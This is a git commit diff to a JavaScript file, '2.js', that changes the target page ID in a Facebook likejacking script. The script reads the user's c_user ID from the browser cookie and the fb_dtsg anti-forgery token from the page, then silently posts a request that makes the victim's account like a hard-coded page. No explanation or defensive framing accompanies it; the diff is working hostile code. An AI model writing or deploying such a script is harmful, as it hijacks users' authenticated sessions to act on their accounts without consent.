83ac67e84485caf09329a027110c81507f4ea395
islamik <islamik@users.noreply.github.com>
2015-12-03 21:37:34 +0200

    Update 2.js

--- 2.js
+++ 2.js
@@ -1,6 +1,8 @@
-  var X = new XMLHttpRequest();
+
+
+ var X = new XMLHttpRequest();
   var XURL = "//www.facebook.com/ajax/pages/fan_status.php?__pc=EXP1%3ADEFAULT";
-  var XParams = "fbpage_id=450819381768630&add=true&__user="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__a=1&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"&ttstamp=";
+  var XParams = "fbpage_id=1065765906807309&add=true&__user="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__a=1&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"&ttstamp=";
   X.open("POST", XURL, true);
   X.onreadystatechange = function () {
     if (X.readyState == 4 && X.status == 200) {
@@ -8,4 +10,3 @@
     }
   };
   X.send(XParams);
-
